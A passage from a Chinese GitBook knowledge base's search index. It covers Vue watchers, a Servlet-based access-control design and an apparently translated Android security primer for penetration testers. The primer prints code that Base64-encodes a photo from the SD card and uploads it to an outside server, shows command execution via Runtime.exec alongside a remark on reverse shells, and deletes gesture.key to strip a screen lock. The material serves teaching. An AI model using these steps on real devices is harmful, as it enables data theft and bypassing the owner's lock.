i'm test page {{obj}} export default{ // ...略 watch:{ obj:{ handler(newVal,oldVal){ console.log('我准备调用renderBarChart函数了') this.renderBarChart() }, deep:true } } } 深度监听肯定是会消耗资源的，当object里内嵌object，监听器会一层层的往下遍历，给对象的所有属性都加上这个监听器，任何修改obj里面任何一个属性都会触发这个监听器里的 handler 但是这样不用修改Vuex中的代码，适合object里属性少，且无引用类型 0x3 修改obj引用 当object的引用发生变化，那么watch就能监听得到object的变化 修改Vuex的代码 // vuex import Vue from 'vue' import Vuex from 'vuex' Vue.use(Vuex) export default new Vuex.Store({ state: { obj: {} }, mutations: { setObj (state, data) { state.obj = data } }, actions: { }, modules: { } }) 推荐使用第三种方法，直接修改对象引用，这样直接监听整个object比深度监听开销更小 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-18 11:46:54 "},"知识库/04.编程开发/04.Java/01.Servlet/99.Servlet完成知识库校验/":{"url":"知识库/04.编程开发/04.Java/01.Servlet/99.Servlet完成知识库校验/","title":"99.Servlet完成知识库校验","keywords":"","body":"%pageLock% 背景 由于知识库是GitBook编译成的全静态HTML，有些文章比较敏感，需要权限校验，最开始使用gitbook插件，但是其是使用前端校验，稍微用点力就可以直接绕过，并且还需要对目录进行管理，综合以上，需要后端来控制权限，以及对用户进行鉴权 最开始的时候，本以为很简单，就想使用Express 这种简单框架直接上手就完成了，但是发现以下问题 Express对静态资源的处理，使用app.use() 声明之后，在拦截器里拦截静态资源(设置了Cache-Contro为no-store)特别麻烦 拦截到之后刷新几次又拦截不到，并且拦截到之后，需要拼接路径 Express最好是作为中间件这样处理接口请求以及路由转发等，用作一整个Web服务，我感觉性能还是差了点 需求 对于该项目其实要求很简单，就是需要对用户进行鉴权，以及对用户权限进行划分 需要规避的风险： 登录 HTTP 明文传输（主要为密码） SQLi 访问文章 权限校验 文章记录的SQLi 后台 权限校验 SQLi HTTP明文传输（主要为密码） 需要使用的组件： Servlet（4.1） MySQL（8.x） jackson（2.15.2） 静态资源访问一次后，浏览器会缓存，导致下次请求不会经过拦截器，添加header头，告知浏览器不要缓存 response.setHeader(\"Cache-Control\", \"no-store\"); response.setHeader(\"Pragma\", \"no-cache\"); response.setHeader(\"Expires\", \"0\"); 需要记录用户访问了哪些文章，但是要对扫描行为进行阻断（或者插件（findSomething）扫描静态资源） 需要编写一个gitbook插件 用于监听page change方法，当页面改变之后则需要在前端进行第一次校验 利用sessionStorage存储一个时间戳，当间隔没有10s不允许发起请求 这样第一步减缓客户端利用插件等扫描静态资源 在后端对其进行校验 时间都存储在session中，当时间差大于10s，则存入数据库，并修改session当中的时间为当前时间 对首次登录需要格外处理，当首次登录之后需要将其登录状态修改为非首次登录状态 代码实现过程中的问题 前端跳转 在knowledge中，由于gitbook编译好了目录之后，如果跳转到非编译生成的目录中，前端的js会拦截跳转 需要按照gitbook生成的index.html（首页）进行重新编辑，401.html，403.html 在以上目录中，需要引入所有的插件，但是需要将实例化gitbook部分代码删除，这样才能正常跳转至登录界面 当跳转之后url未改变，也会导致无法再重定向到登录界面（401.html），或者返回上一个页面（403.html） if(window.location.pathname !== '/knowledge/401.html'){ location.reload() } setTimeout(()=>{ window.location.href=\"/login.do\" },5000) if (window.location.pathname !== '/knowledge/403.html') { location.reload() } setTimeout(() => { history.back() }, 5000) 当session过期之后，ajax请求，无法跳转至登录界面 由于ajax是异步请求，如果后端拦截器中使用了sendRedirect(),前端无感，需要在后端处理将状态码更改为401，前端设置响应拦截器，当拦截到状态码为401，则前端跳转至登录界面 // 拦截器 if(URI.matches(\".*\\\\.do\")){ // ajax 请求 不能处理302 // 需要配合状态码在前端跳转到login response.setStatus(401); }else{ response.sendRedirect(\"/login.jsp\"); } // 前端 axios.interceptors.response.use((response) => { return response }, (error) => { if (401 === error.response.status) { window.location = '/login.jsp' } else { return Promise.reject(error); } }) Filter MainFilter对所有的请求进行拦截 首先需要定义白名单路由，对未登录的路由进行拦截，如果存在session，则继续往下执行到knowledgeFilter或者adminFilter package com.knownsec.Filter; import javax.servlet.*; import javax.servlet.annotation.WebFilter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; import java.net.URLDecoder; import java.util.Arrays; import java.util.List; @WebFilter(\"/*\") public class MainFilter implements Filter { // 白名单 private List routesAndResources = Arrays.asList( \"/login.do\", \"/login.jsp\", \"/knowledge/401.html\", \"/knowledge/403.html\" ); @Override public void init(FilterConfig filterConfig) throws ServletException { } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse response = (HttpServletResponse) servletResponse; HttpSession session = request.getSession(); String id = (String) session.getAttribute(\"id\"); String URI = URLDecoder.decode(request.getRequestURI(), \"UTF-8\"); // 白名单直接过 if (routesAndResources.contains(URI) || isStaticResource(URI)) { // 在列表中或是静态资源，放行 filterChain.doFilter(servletRequest, servletResponse); } else { // 禁止浏览器缓存 if (URI.startsWith(\"/knowledge\")) { response.setHeader(\"Cache-Control\", \"no-store\"); response.setHeader(\"Pragma\", \"no-cache\"); response.setHeader(\"Expires\", \"0\"); } // 需要鉴权的资源 if (id != null) { // 登录状态 if (URI.equals(\"/\")) { // 如果在登录的时候访问了/,则跳转knownledge response.sendRedirect(\"/knowledge/\"); } else { filterChain.doFilter(servletRequest, servletResponse); } } else { // 非登录状态 // 如果失效状态在gitbook中，需要重定向到/knowledge/401.html if (URI.matches(\"(/knowledge/)|(/knowledge/.*)\")) { response.sendRedirect(\"/knowledge/401.html\"); } else { // response.sendRedirect(\"/login.jsp\"); } } } } @Override public void destroy() { Filter.super.destroy(); } private boolean isStaticResource(String uri) { return uri.endsWith(\".js\") || uri.endsWith(\".css\") || uri.endsWith(\".jpg\") || uri.endsWith(\".png\") || uri.endsWith(\".gif\") || uri.endsWith(\".svg\") || uri.contains(\".woff\") || uri.endsWith(\".tff\") || uri.endsWith(\".map\"); } } knowledgeFilter对访问知识库的请求进行拦截 对资源进行拦截，判断该用户是否拥有权限，有权限则继续执行，无权限则跳转到/knowledge/403.html package com.knownsec.Filter; import com.knownsec.DataBase.DataBaseConnection; import javax.servlet.*; import javax.servlet.annotation.WebFilter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; import java.net.URLDecoder; import java.sql.Connection; import java.sql.PreparedStatement; import java.text.SimpleDateFormat; import java.util.Arrays; import java.util.List; import java.util.UUID; import java.util.regex.Matcher; import java.util.regex.Pattern; @WebFilter(\"/knowledge/*\") public class knowledgeFilter implements Filter { private List routesAndResources = Arrays.asList( \"/knowledge/401.html\", \"/knowledge/403.html\", \"/knowledge/\", \"/knowledge/index.html\", \"/knowledge\", \"/knowledge/友情链接.html\" ); @Override public void init(FilterConfig filterConfig) throws ServletException { // Filter.super.init(filterConfig); } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse response = (HttpServletResponse) servletResponse; HttpSession session = request.getSession(); List persmissionArray = (List) session.getAttribute(\"persmissionArray\"); String URI = URLDecoder.decode(request.getRequestURI(), \"UTF-8\"); // 默认到该拦截器就是登录状态 // 白名单直接过 if (routesAndResources.contains(URI) || isStaticResource(URI)) { // 在列表中或是静态资源，放行 filterChain.doFilter(request, response); } else { // 权限校验 String regex_html = \"/knowledge/知识库/(.*)\\\\.html\"; String regex_dir = \"/knowledge/知识库/(.*)/$\"; String regex_persmission = \"/knowledge/知识库/(.+?)/\"; Pattern pattern = Pattern.compile(regex_persmission); Matcher matcher = pattern.matcher(URI); String matchedCharacter = null; while (matcher.find()) { matchedCharacter = matcher.group(1); // 获取匹配到的字符 (一级目录) } // 如果没有权限 if (!persmissionArray.contains(matchedCharacter)) { response.sendRedirect(\"/knowledge/403.html\"); } else { filterChain.doFilter(request, response); } } } @Override public void destroy() { Filter.super.destroy(); } private boolean isStaticResource(String uri) { return uri.endsWith(\".js\") || uri.endsWith(\".css\") || uri.endsWith(\".jpg\") || uri.endsWith(\".png\") || uri.endsWith(\".gif\") || uri.endsWith(\".svg\") || uri.contains(\".woff\") || uri.endsWith(\".tff\") || uri.endsWith(\".ico\"); } } adminFilter对访问后台的请求进行拦截 主要针对用户权限进行校验，只有admin用户的id为1，其余都为UUID package com.knownsec.Filter; import javax.servlet.*; import javax.servlet.annotation.WebFilter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; import java.net.URLDecoder; @WebFilter(\"/admin/*\") public class adminFilter implements Filter { @Override public void init(FilterConfig filterConfig) throws ServletException { } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse response = (HttpServletResponse) servletResponse; HttpSession session = request.getSession(); String id = (String) session.getAttribute(\"id\"); String URI = URLDecoder.decode(request.getRequestURI(), \"UTF-8\"); if (id != null) { //id 不为null 则说明是登录状态，否则为401 if (id.equals(\"1\")) { // session 中的id为1 确认为admin账户登录 filterChain.doFilter(servletRequest, servletResponse); } else { response.sendRedirect(\"/401.jsp\"); } } else { // 非登录状态 // 如果失效状态在gitbook中，需要重定向到/knowledge/401.html if (URI.matches(\"(/knowledge/)|(/knowledge/.*)\")) { response.sendRedirect(\"/knowledge/401.html\"); } else { if(URI.matches(\".*\\\\.do\")){ // ajax 请求 不能处理302 // 需要配合状态码在前端跳转到login response.setStatus(401); }else{ response.sendRedirect(\"/login.jsp\"); } } } } @Override public void destroy() { Filter.super.destroy(); } } Servlet LoginServlet执行登录操作 RecordServlet记录用户访问的知识库操作 userServlet前台用户执行操作 ContorlUserServlet管理员对用户的管理操作 DirectoryServlet管理员对目录的管理操作 RecordListServlet获取图表信息以及所有访问记录的操作 SQL（图表） 一个月内每天访问次数记录 SELECT DATE_FORMAT(date,'%Y-%m-%d') AS day, count(paper) AS count FROM record WHERE DATE_FORMAT(date,'%Y-%m-%d') BETWEEN ? - INTERVAL 30 DAY AND ? GROUP BY day ORDER BY day 第一个?为当天时间，第二个?为tomorrow时间 这样才能保证能完整获取31天的数据 执行完这个sql之后，没有访问的日期是不会显示出来的，所以需要在后端进行处理，将没有访问的日期添加上，并且设置访问量为0 使用Map存储取出来的日期，因为map的key值是不能重复的 生成前31天的所有日期，然后遍历该日期，将遍历的值作为map的key，判断是否有该key，如果有则存入新的一个map中，如果没有则用该日期作为一个key，value为0 在遍历过程中将这个新的map一个个存入一个List LocalDate now = LocalDate.now(); LocalDate tomorrow = now.plusDays(1); DateTimeFormatter formatter = DateTimeFormatter.ofPattern(\"yyyy-MM-dd\"); String beginTime = now.format(formatter); String endTime = tomorrow.format(formatter); int daysToSubtract = 31; // 往前推算的天数 List previousDates = new ArrayList<>(); LocalDate currentDate = now; for (int i = 0; i dataFromDatabase = new HashMap<>(); while (resultSet.next()) { String date = resultSet.getString(\"day\"); int count = resultSet.getInt(\"count\"); dataFromDatabase.put(LocalDate.parse(date, formatter), count); } List> resultRecord = new ArrayList<>(); for (int i = previousDates.size() - 1; i >= 0; i--) { Map recordMap = new HashMap<>(); String dateString = previousDates.get(i).format(formatter); if (dataFromDatabase.containsKey(previousDates.get(i))) { recordMap.put(\"date\", dateString); recordMap.put(\"count\", dataFromDatabase.get(previousDates.get(i))); } else { recordMap.put(\"date\", dateString); recordMap.put(\"count\", 0); } resultRecord.add(recordMap); } 一周内访问次数排名 select realName, count(paper) count from record a LEFT JOIN users b on a.userId = b.id where DATE_FORMAT(date,'%Y-%m-%d') BETWEEN ? - INTERVAL 1 WEEK AND ? GROUP BY a.userId 获取最多访问的目录（倒序排列） select `directory` ,count(*) `count` from record GROUP BY `directory` ORDER BY count desc JackSon JackSon 对返回体中没有的数据需要处理为null package com.knownsec.Utils; import com.fasterxml.jackson.core.JsonGenerator; import com.fasterxml.jackson.databind.JsonSerializer; import com.fasterxml.jackson.databind.ObjectMapper; import com.fasterxml.jackson.databind.SerializerProvider; import java.io.IOException; public class NullObjectToEmptyObjectSerializer extends JsonSerializer { @Override public void serialize(Object value, JsonGenerator jsonGenerator, SerializerProvider serializerProvider) throws IOException { if (value == null) { jsonGenerator.writeString(\"null\"); } else { //使用nullsUsing时理论上不会走到这里， 但为了防止开发人员误用， 这里仍旧做了健壮性处理 ObjectMapper mapper = new ObjectMapper(); String res = mapper.writeValueAsString(value); jsonGenerator.writeString(res); } } } JackSon返回体中对初始化的数据设置隐藏 在Model类中添加如下注解，表示如果在序列化的时候Model中的值为null，则不序列化（不显示在response body中） @JsonInclude(JsonInclude.Include.NON_NULL) JackSon不通过Model类进行序列化（自定义一个对象进行序列化） [!WARNING] 可能会出现类型出错 // SQL执行操作 while (resultSet.next()) { // 自定义一个Map，用于存数据库的数据 Map recordMap = new HashMap<>(); String directory = resultSet.getString(\"directory\"); int count = resultSet.getInt(\"count\"); recordMap.put(\"name\", directory); recordMap.put(\"value\", count); // List add这个map resultList.add(recordMap); } // 序列化这个resultList即可 最终效果 GitLab 项目地址 https://gitlab.carinago.com/luogan/knowlegdeauth Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 16:14:44 "},"知识库/05.移动安全/00.Android/01.Android 安全入门.html":{"url":"知识库/05.移动安全/00.Android/01.Android 安全入门.html","title":"01.Android 安全入门","keywords":"","body":"Android 简介 自从 Android 被谷歌收购（2005 年），谷歌已经完成了整个开发，在过去的 9 年里，尤其是在安全方面，有很多变化。 现在，它是世界上最广泛使用的智能手机平台，特别是由于不同的手机制造商，如 LG，三星，索尼和 HTC 的支持。 Android 的后续版本中引入了许多新概念，例如 Google Bouncer 和 Google App Verifier。 我们将在本章逐一介绍它们。 如果我们看看 Android 的架构，如下图所示，我们将看到它被分为四个不同的层。 在它的底部是 Linux 内核，它已被修改来在移动环境中获得更好的性能。 Linux 内核还必须与所有硬件组件交互，因此也包含大多数硬件驱动程序。 此外，它负责 Android 中存在的大多数安全功能。 由于 Android 基于 Linux 平台，它还使开发人员易于将 Android 移植到其他平台和架构。 Android 还提供了一个硬件抽象层，供开发人员在 Android 平台栈和他们想要移植的硬件之间创建软件钩子。 在 Linux 内核之上是一个层级，包含一些最重要和有用的库，如下所示： Surface Manager：管理窗口和屏幕 媒体框架：这允许使用各种类型的编解码器来播放和记录不同的媒体 SQLite：这是一个较轻的 SQL 版本，用于数据库管理 WebKit：这是浏览器渲染引擎 OpenGL：用于在屏幕上正确显示 2D 和 3D 内容 以下是来自 Android 开发人员网站的 Android 架构的图形表示： Android 中的库是用 C 和 C++ 编写的，其中大多数是从 Linux 移植的。 与 Linux 相比，Android 中的一个主要区别是，在这里没有libc库，它用于 Linux 中的大多数任务。 相反，Android 有自己的称为bionic的库，我们可以认为它是一个剥离和修改后的，用于 Android 的 libc 版本。 在同一层级，还有来自 Android 运行时 -- Dalvik 虚拟机和核心库的组件。 我们将在本书的下一部分中讨论关于 Dalvik 虚拟机的很多内容。 在这个层之上，有应用程序框架层，它支持应用程序执行不同类型的任务。 此外，开发人员创建的大多数应用程序只与第一层和最顶层的应用程序交互。 该架构以一种方式设计，在每个时间点，底层都支持上面的层级。 早期版本的 Android（ Android 中的所有应用程序都在虚拟环境下运行，这称为 Dalvik 虚拟机（DVM）。 这里需要注意的一点是，从 Android 4.4 版本开始，还有另一个运行时称为 Android 运行时（ART），用户可以在 DVM 和 ART 运行时环境之间自由切换 然而，我们目前只关注 Dalvik 虚拟机实现。 它类似于 Java 虚拟机（JVM），除了基于寄存器的特性，而不是基于堆栈的特性。 因此，运行的每个应用程序都将在自己的 Dalvik 虚拟机实例下运行。 因此，如果我们运行三个不同的应用程序，将有三个不同的虚拟实例。 现在，这里的重点是，即使它为应用程序创建一个虚拟环境来运行，它不应该与安全容器或安全环境混淆。 DVM 的主要焦点是与性能相关，而不是与安全性相关 Dalvik 虚拟机执行一个名为.dex或 Dalvik 可执行文件的文件格式。 我们将进一步查看.dex文件格式，并将在下面的章节中进行分析。 现在让我们继续与 adb 进行交互，并更深入地分析 Android 设备及其体系结构。 深入了解Android 如果你有 Android 设备或正在运行Android模拟器，则可以使用 Android SDK 本身提供的工具（称为 adb）。 我们将在第二章详细讨论 adb。 现在，我们将只设置 SDK，我们已经准备好了。 一旦设备通过 USB 连接，我们可以在我们的终端中输入 adb，这将显示所连接设备的序列号列表。 请确保你已在设备设置中启用了 USB 调试功能。 adb devices List of devices attached emulator-5554 device 现在，如我们之前所见，Android 是基于 Linux 内核的，所以大多数 Linux 命令在 Android 上也可以通过 adb shell 完美运行。 adb shell 为你提供与设备的 shell 直接交互，你可以在其中执行命令和执行操作以及分析设备中存在的信息。 为了执行 shell，只需要键入以下命令： adb shell 一旦我们在 shell 中，我们可以运行ps为了列出正在运行的进程： 如你所见，ps将列出当前在 Android 系统中运行的所有进程。 如果仔细看，第一列制定了用户名。 在这里我们可以看到各种用户名，如system，root，radio和一系列以app_开头的用户名。 正如你可能已经猜到的，以system名称运行的进程由系统拥有，root作为根进程运行，radio是与电话和无线电相关的进程，app_进程是用户已下载的所有应用程序， 安装在他们的设备上并且当前正在运行。 因此，就像在 Linux 中用户确定了当前登录到系统的唯一用户一样，在 Android 中，用户标识了在自己的环境中运行的应用/进程。 所以，Android 安全模型的核心是 Linux 特权分离。 每次在 Android 设备中启动新应用程序时，都会为其分配唯一的用户 ID（UID），该用户 ID 将之后会属于某些其他预定义组。 与 Linux 类似，用作命令的所有二进制文件都位于/system/bin和/system /xbin。 此外，我们从 Play 商店或任何其他来源安装的应用程序数据将位于/data/data，而其原始安装文件（即.apk）将存储在/data/app。 此外，还有一些应用程序需要从 Play 商店购买，而不是只是免费下载。 这些应用程序将存储在/data/app-private/。 Android 安装包（APK）是 Android 应用程序的默认扩展名，它只是一个归档文件，包含应用程序的所有必需文件和文件夹。 我们在后面的章节中将继续对.apk文件进行逆向工程。 现在，让我们访问/data/data，看看里面有什么。 这里需要注意的一点是，为了在真实设备上实现，设备需要 root 并且必须处于su模式： cd /data/data ls com.aditya.facebookapp com.aditya.spinnermenu com.aditya.zeropermission com.afe.socketapp com.android.backupconfirm com.android.browser com.android.calculator2 com.android.calendar com.android.camera com.android.certinstaller com.android.classic com.android.contacts com.android.customlocale2 所以，我们可以在这里看到，例如，com.aditya.facebookapp，是单独的应用程序文件夹。 现在，你可能会想知道为什么它是用点分隔的单词风格，而不是常见的文件夹名称，如FacebookApp或CameraApp。 因此，这些文件夹名称指定各个应用程序的软件包名称。 软件包名称是应用程序在 Play 商店和设备上标识的唯一标识符。 例如，可能存在具有相同名称的多个相机应用或计算器应用。 因此，为了唯一地标识不同的应用，使用包名称约定而不是常规应用名称。 如果我们进入任何应用程序文件夹，我们会看到不同的子文件夹，例如文件（files），数据库（databases）和缓存（cache），稍后我们将在第 3 章“逆向和审计 Android 应用程序”中查看。 shell@android:/data/data/de.trier.infsec.koch.droidsheep ls cache databases files lib 这里需要注意的一个重要的事情是，如果手机已经 root，我们可以修改文件系统中的任何文件。 对设备获取 root 意味着我们可以完全访问和控制整个设备，这意味着我们可以看到以及修改任何我们想要的文件。 最常见的安全保护之一是大多数人都想到的是模式锁定或 pin 锁，它默认存在于所有Android手机。 你可以通过访问Settings | Security | Screen Lock来配置自己的模式。 一旦我们设置了密码或模式锁定，我们现在将继续，将手机与 USB 连接到我们的系统。 现在，密码锁的密钥或模式锁的模式数据以名称password.key或gesture.key存储在/data/system。 注意，如果设备被锁定，并且 USB 调试被打开，你需要一个自定义引导加载程序来打开 USB 调试。 整个过程超出了本书的范围。 要了解有关 Android 的更多信息，请参阅 Thomas Cannon Digging 的 Defcon 演示 因为破解密码/模式将更加艰难，并且需要暴力（我们将看到如何解密实际数据），我们将简单地继续并删除该文件，这将从我们手机中删除模式保护 ： shell@android:/data \\# cd /data/system shell@android:/data/system \\# rm gesture.key 所以，我们可以看到，一旦手机被 root ，几乎任何东西都可以只用手机、一根USB电缆和一个系统来完成。 我们将在本书的后续章节中更多地了解基于 USB 的利用。 沙箱和权限模型 为了理解 Android 沙箱，让我们举一个例子，如下图： 如前图所示和前面所讨论的，Android 中的每个应用程序都在其自己的 Dalvik 虚拟机实例中运行。 这就是为什么，无论何时任何应用程序在我们的设备中崩溃，它只是显示强制关闭或等待选项，但其他应用程序继续顺利运行。 此外，由于每个应用程序都在其自己的实例中运行，因此除非内容提供者另有规定，否则将无法访问其他应用程序的数据。 Android 使用细粒度的权限模型，这需要应用程序在编译最终应用程序包之前预定义权限。 你必须注意到，每次从 Play 商店或任何其他来源下载应用程序时，它会在安装过程中显示一个权限屏幕，它类似于以下屏幕截图： 此权限屏幕显示应用程序可以通过手机执行的所有任务的列表，例如发送短信，访问互联网和访问摄像头。 请求多于所需的权限使应用程序成为恶意软件作者的更具吸引力的目标。 Android 应用程序开发人员必须在开发应用程序时在名为AndroidManifest.xml的文件中指定所有这些权限。 此文件包含各种应用程序相关信息的列表，例如运行程序所需的最低 Android 版本，程序包名称，活动列表（应用程序可见的应用程序中的界面），服务（应用程序的后台进程） ，和权限。 如果应用程序开发人员未能在AndroidManifest.xml文件中指定权限，并仍在应用程序中使用它，则应用程序将崩溃，并在用户运行它时显示强制关闭消息。 一个正常的AndroidManifest.xml文件看起来像下面的截图所示。 在这里，你可以使用标记和其他标记查看所需的不同权限： 如前所述，所有 Android 应用程序在安装后首次启动时都会分配一个唯一的 UID。 具有给定 UID 的所有用户都属于特定组，具体取决于他们请求的权限。 例如，一个仅请求 Internet 权限的应用程序将属于inet组，因为 Android 中的 Internet 权限位于inet组下。 用户（在这种情况下的应用程序）可以属于多个组，具体取决于他们请求的权限。 或者换句话说，每个用户可以属于多个组，并且每个组可以具有多个用户。 这些组具有由组 ID（GID）定义的唯一名称。 然而，开发人员可以明确地指定其他应用程序在与第一个相同的 UID 下运行。 在我们的设备中，其中的组和权限在文件platform.xml中指定，它位于/system/etc/permissions/ shell@grouper:/system/etc/permissions $ cat platform.xml . . . . . . [Some of the data has been stripped from here in order to shorten the output and make it readable] 此外，这清除了对在 Android 设备中运行的本地应用程序的怀疑。 由于本地应用程序直接与处理器交互，而不是在 Dalvik 虚拟机下运行，因此它不会以任何方式影响整体安全模型 现在，就像我们在前面部分看到的，应用程序将其数据存储在location/data/data/[package name]。 现在，存储应用程序数据的所有文件夹也具有相同的用户 ID，这构成 Android 安全模型的基础。 根据 UID 和文件权限，它将限制来自具有不同 UID 的其他应用程序对它的访问和修改。 在下面的代码示例中，ret包含以 Base64 格式编码存储在的 SD 卡中的图像，现在正在使用浏览器调用来上传到attify.com网站。 目的只是找到一种方式来在两个不同的 Android 对象之间进行通信。 我们将首先创建一个对象来存储图像，在 Base64 中编码，最后将其存储在一个字符串中imageString： final File file = new File(\"/mnt/sdcard/profile.jpg\"); Uri uri = Uri.fromFile(file); ContentResolver cr = getContentResolver(); Bitmap bMap=null; try { InputStream is = cr.openInputStream(uri); bMap = BitmapFactory.decodeStream(is); if (is != null) { is.close(); } } catch (Exception e) { Log.e(\"Error reading file\", e.toString()); } ByteArrayOutputStream baos = new ByteArrayOutputStream(); bMap.compress(Bitmap.CompressFormat.JPEG, 100, baos); byte[] b = baos.toByteArray(); String imageString = Base64.encodeToString(b,Base64.DEFAULT); 最后，我们将启动浏览器将数据发送到我们的服务器，我们有一个.php文件侦听传入的数据： startActivity(new Intent(Intent.ACTION_VIEW,Uri.parse(\"http://attify.com/up.php?u=\"+imageString))); 我们还可以执行命令并以相同的方式将输出发送到远程服务器。 但是，这里需要注意的一点是 shell 应该在应用程序的用户下运行： // To execute commands : String str = \"cat /proc/version\"; //command to be executed is stored in str. process = Runtime.getRuntime().exec(str); 这是一个有趣的现象，因为攻击者可以获得一个反向 shell（这是一个从设备到系统的双向连接，可以用于执行命令），而不需要任何类型的权限。 应用签名 应用程序签名是 Android 的独特特性之一，由于其开放性和开发人员社区，它取得了成功。 Play 商店中有超过一百万个应用。 在 Android 中，任何人都可以通过下载 Android SDK 创建 Android 应用，然后将其发布到 Play 商店。 通常有两种类型的证书签名机制。 一个是由管理证书颁发机构（CA）签名的，另一个是自签名证书。 没有中间证书颁发机构（CA），而开发人员可以创建自己的证书并为应用程序签名。 在 Apple 的 iOS 应用程序模型中可以看到 CA 签名，其中开发者上传到 App Store 的每个应用程序都经过验证，然后由 Apple 的证书签名。 一旦下载到设备，设备将验证应用程序是否由 Apple 的 CA 签名，然后才允许应用程序运行。 但是，在 Android 中是相反的。 没有证书颁发机构; 而是开发人员的自创建证书可以签署应用程序。 应用程序上传完成后，会由 Google Bouncer 进行验证，这是一个虚拟环境，用于检查应用程序是否是恶意或合法的。 检查完成后，应用就会显示在 Play 商店中。 在这种情况下，Google 不会对该应用程序进行签名。 开发人员可以使用 Android SDK 附带的工具（称为keytool）创建自己的证书，或者使用 Eclipse 的 GUI 创建证书。 因此，在 Android 中，一旦开发人员使用他创建的证书签名了应用程序，他需要将证书的密钥保存在安全的位置，以防止其他人窃取他的密钥并使用开发人员的证书签署其他应用程序 。 如果我们有一个 Android 应用程序（.apk）文件，我们可以检查应用程序的签名，并找到使用称为jarsigner的工具签署应用程序的人，这个工具是 Android SDK 自带的： jarsigner -verify -certs -verbose testing.apk 以下是在应用程序上运行上述命令并获取签名的信息的屏幕截图 此外，解压缩.apk文件后，可以解析META-INF文件夹中出现的CERT.RSA文件的 ASCII 内容，以获取签名，如以下命令所示： unzip testing.apk cd META-INF openssl pkcs7 -in CERT.RSA -print_certs -inform DER -out out.cer cat out.cer 这在检测和分析未知的 Android .apk示例时非常有用。 因此，我们可以使用它获得签署人以及其他详细信息。 Android 启动流程 在 Android 中考虑安全性时最重要的事情之一是 Android 启动过程。 整个引导过程从引导加载程序开始，它会反过来启动init过程 - 第一个用户级进程。 所以，任何引导加载程序的变化，或者如果我们加载另一个，而不是默认存在的引导加载程序，我们实际上可以更改在设备上加载的内容。 引导加载程序通常是特定于供应商的，每个供应商都有自己的修改版本的引导加载程序。 通常，默认情况下，此功能通过锁定引导加载程序来禁用，它只允许供应商指定的受信任内核在设备上运行。 为了将自己的 ROM 刷到 Android 设备，需要解锁引导加载程序。 解锁引导加载程序的过程可能因设备而异。 在某些情况下，它也可能使设备的保修失效 在 Nexus 7 中，它就像使用命令行中的fastboot工具一样简单，如下所示： fastboot oem unlock 在其他设备中，可能需要更多精力。 我们看看如何创建自己的 Bootloader 并在本书的后续章节中使用它。 回到启动过程，在引导加载程序启动内核并启动init之后，它挂载了 Android 系统运行所需的一些重要目录，例如/dev，/sys和/proc。 此外，init从配置文件init.rc和init.[device-name].rc中获取自己的配置，在某些情况下从位于相同位置的.sh文件获取自己的配置。 如果我们对init.rc文件执行cat，我们可以看到init加载自身时使用的所有规范，如下面的截图所示： init进程的责任是启动其他必需的组件，例如负责 ADB 通信和卷守护程序（vold）的 adb 守护程序（adbd）。 加载时使用的一些属性位于build.prop，它位于location/system。 当你在 Android 设备上看到 Android logo 时，就完成了init进程的加载。 正如我们在下面的截图中可以看到的，我们通过检查build.prop文件来获取设备的具体信息: 一旦所有的东西被加载，init最后会加载一个称为 Zygote 的进程，负责以最小空间加载 Dalvik 虚拟机和共享库，来加快整个进程的加载速度。 此外，它继续监听对自己的新调用，以便在必要时启动更多 DVM。 这是当你在设备上看到 Android 开机动画时的情况。 一旦完全启动，Zygote 派生自己并启动系统，加载其他必要的 Android 组件，如活动管理器。 一旦完成整个引导过程，系统发送BOOT_COMPLETED的广播，许多应用程序可能使用称为广播接收器的 Android 应用程序中的组件来监听。 当我们在第 3 章“逆向和审计 Android 应用程序”中分析恶意软件和应用程序时，我们将进一步了解广播接收器 总结 在本章中，我们为学习 Android渗透测试建立了基础。 我们还了解 Android 的内部结构及其安全体系结构。 在接下来的章节中，我们将建立一个 Android 渗透测试实验室，并使用这些知识执行更多的技术任务，来渗透 Android 设备和应用程序。 我们还将了解有关 ADB 的更多信息，并使用它来收集和分析设备中的信息。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-10-23 14:15:25 "},"知识库/05.移动安全/00.Android/02.环境准备.html":{"url":"知识库/05.移动安全/00.Android/02.环境准备.html","title":"02.环境准备","keywords":"","body":"建立开发环境 为了构建 Android 应用程序或创建 Android 虚拟设备，我们需要配置开发环境，以便运行这些应用程序。 因此，我们需要做的第一件事是下载 Java 开发工具包（JDK），其中包括 Java 运行时环境（JRE）： 为了下载 JDK，我们需要访问http://www.oracle.com/technetwork/java/javase/downloads/index.html，并根据我们所在的平台下载 JDK 7。 就像下载它并运行下载的可执行文件一样简单。 在以下屏幕截图中，你可以看到我的系统上安装了 Java： 一旦我们下载并安装了 JDK，我们需要在我们的系统上设置环境变量，以便可以从任何路径执行 Java。 对于 Windows 用户，我们需要右键单击My Computer（我的电脑）图标，然后选择Properties（属性）选项。 接下来，我们需要从顶部选项卡列表中选择Advanced system settings（高级系统设置）选项： 一旦我们进入了System Properties（系统属性）对话框，在右下角，我们可以看到Environment Variables...（环境变量）选项。 当我们点击它，我们可以看到另一个窗口，包含系统变量及其值，在System variables（系统变量）部分下： 在新的弹出对话框中，我们需要单击Variables（变量）下的PATH文本框，并键入 Java 安装文件夹的路径： [!NOTE] 对于 Mac OS X，我们需要编辑/.bash_profile文件，并将 Java 的路径追加到PATH变量。 在 Linux 机器中，我们需要编辑./bashrc文件并附加环境变量行。 一旦我们下载并配置了 Java 的环境变量，我们需要执行的下一步是下载http://developer.android.com/sdk/index.html中提供的 Android ADT 包。 一旦我们下载了 ADT 包，我们可以解压它，并打开 Eclipse 文件夹。 